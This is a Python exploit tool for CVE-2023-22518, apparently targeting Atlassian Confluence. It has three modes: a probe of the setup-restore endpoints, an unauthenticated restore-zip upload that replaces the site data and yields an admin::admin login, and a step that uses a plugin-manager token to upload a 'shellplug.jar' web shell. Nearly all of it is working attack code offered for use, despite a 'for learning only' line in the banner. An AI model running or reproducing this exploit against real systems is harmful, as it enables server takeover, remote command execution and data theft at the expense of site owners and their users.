# -*- coding: utf-8 -*-
import argparse
import glob
import json
import os
import random
import string
import time
from urllib.parse import urljoin

import httpx
from bs4 import BeautifulSoup
from loguru import logger

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    "X-Atlassian-Token": "no-check"
}

# 代理设置
PROXIES = {}


def banner():
    print('''
        
     ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗       ██████╗ ██████╗ ███████╗ ██╗ █████╗ 
    ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗      ╚════██╗╚════██╗██╔════╝███║██╔══██╗
    ██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗ █████╔╝ █████╔╝███████╗╚██║╚█████╔╝
    ██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝██╔═══╝ ██╔═══╝ ╚════██║ ██║██╔══██╗
    ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝      ███████╗███████╗███████║ ██║╚█████╔╝
     ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝       ╚══════╝╚══════╝╚══════╝ ╚═╝ ╚════╝ 
                                                                                                            
                                                                            @Auth: C1ph3rX13
                                                                            @Blog: https://c1ph3rx13.github.io
                                                                            @Note: 代码仅供学习使用，请勿用于其他用途
    ''')


def randstr(length: int) -> str:
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))


def get_zips() -> str:
    current_directory = os.getcwd()
    zip_files = glob.glob(os.path.join(current_directory, '*.zip'))
    zip_files_str = '\n'.join(zip_files)
    return zip_files_str


@logger.catch
def poc(target: str, client: httpx.Client) -> bool:
    headers.update({'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryT3yekvo0rGaL9QR7'})

    paths = [
        "/json/setup-restore.action",
        "/json/setup-restore-local.action",
        "/json/setup-restore-progress.action",
        "/server-info.action"
    ]

    for path in paths:
        url = urljoin(target, path)

        # 随机上传文件名
        rand_str = randstr(10)

        # 上传zip
        content = (
            '------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n'
            'Content-Disposition: form-data; name="buildIndex"\r\n\r\n'
            'true\r\n'
            '------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n'
            f'Content-Disposition: form-data; name="file";filename="{rand_str}.zip"\r\n\r\n'
            f'{rand_str}\r\n'
            '------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n'
            'Content-Disposition: form-data; name="edit"\r\n\r\n'
            'Upload and import\r\n'
            '------WebKitFormBoundaryT3yekvo0rGaL9QR7--\r\n'
        )

        response = client.post(url=url, content=content.encode('utf-8'), headers=headers)
        if (
                response.status_code == httpx.codes.OK
                and 'The zip file did not contain an entry' in response.text
                and 'exportDescriptor.properties' in response.text
        ):
            soup = BeautifulSoup(response.text, "lxml")
            code_tag = soup.find('code').text
            logger.success(f'VULNERABLE: Host: {url}')
            logger.success(f'Code: {response.status_code} | ServerPath: {code_tag}')
            return True
        else:
            logger.success(f'NOT VULNERABLE: Host: {url}')
            continue


@logger.catch
def exp(target: str, client: httpx.Client):
    url = urljoin(target, '/json/setup-restore.action?synchronous=true')

    filepath = get_zips()
    logger.info(f'Get zips: {filepath}')

    files = {
        "buildIndex": (None, "false"),
        "edit": (None, "Upload and import"),
        "file": ("ZIP_DATA", open(filepath, "rb"), "application/zip")
    }

    response = client.post(url=url, files=files)
    if response.status_code == httpx.codes.OK:
        logger.success("Exploit Success! Login Using 'admin :: admin'")
    else:
        logger.warning(f'Error: {response.status_code}')


def get_token(target: str, jsessionid: str, client: httpx.Client):
    cookies = {'JSESSIONID': jsessionid}
    timestamp = int(time.time())
    url = urljoin(target, f'/rest/plugins/1.0/?_={timestamp}')

    response = client.get(url=url, cookies=cookies)
    upm_token = response.headers.get('upm-token')
    return upm_token


def get_alt_token(target: str, jsessionid: str, client: httpx.Client):
    cookies = {
        'JSESSIONID': jsessionid
    }
    # 管理应用认证跳转
    auth_url = urljoin(target, '/doauthenticate.action')
    auth_resp = client.post(url=auth_url, cookies=cookies)
    soup = BeautifulSoup(auth_resp.text, "lxml")
    atl_token = soup.find('input', {'name': 'atl_token'}).get('value')

    data = {
        'atl_token': atl_token,
        'password': 'admin',
        'authenticate': '确认',
        'destination': '/plugins/servlet/upm',
    }
    check_resp = client.post(url=auth_url, cookies=cookies, data=data)
    if check_resp.status_code == httpx.codes.OK:
        logger.success('alt_token checked !')


def get_shell(target: str, jsessionid: str, upm_token: str, client: httpx.Client):
    cookies = {
        'JSESSIONID': jsessionid
    }

    files = {
        'plugin': ('shellplug.jar', open('./shellplug.jar', "rb"), 'application/octet-stream'),
        'url': (None, '')
    }

    url = urljoin(target, f'/rest/plugins/1.0/?token={upm_token}')

    response = client.post(url=url, files=files, cookies=cookies)
    if response.status_code == 202:
        json_str = response.text.replace('<textarea>', '').replace('</textarea>', '')
        # 转换为 JSON 对象
        json_data = json.loads(json_str)
        logger.success(f'Status: {json_data["status"]}')
        logger.success(f'Links: {json_data["links"]}')
        shell_url = urljoin(target, '/plugins/servlet/com.jsos.shell/ShellServlet')
        shell_resp = client.get(url=shell_url)
        if shell_resp.status_code == httpx.codes.OK:
            logger.success(f'GetShell Success: {shell_resp.url}')


if __name__ == '__main__':
    banner()
    parser = argparse.ArgumentParser(description='CVE-2023-22518 by C1ph3rX13.')
    parser.add_argument('action', choices=['poc', 'exp', 'shell'], help='Action to perform')
    parser.add_argument('-t', '--target', type=str, required=True, help='Target Url')
    parser.add_argument('-id', '--jsessionid', type=str, required=False, help='JSESSIONID')
    parser.add_argument('--timeout', type=int, default=30, required=False, help='Timeout (Default: 30 Seconds)')
    parser.add_argument("--proxy", type=str, required=False, help='Proxy')
    args = parser.parse_args()

    if args.proxy:
        PROXIES = {'all://': f'{args.proxy}'}

    with httpx.Client(headers=headers, verify=False, timeout=args.timeout, follow_redirects=True,
                      proxies=PROXIES) as client:
        if args.action == 'poc':
            poc(args.target, client)

        if args.action == 'exp':
            if poc(args.target, client):
                exp(args.target, client)

        if args.action == 'shell':
            if poc(args.target, client):
                get_alt_token(args.target, args.jsessionid, client)
                token = get_token(args.target, args.jsessionid, client)
                get_shell(args.target, args.jsessionid, token, client)
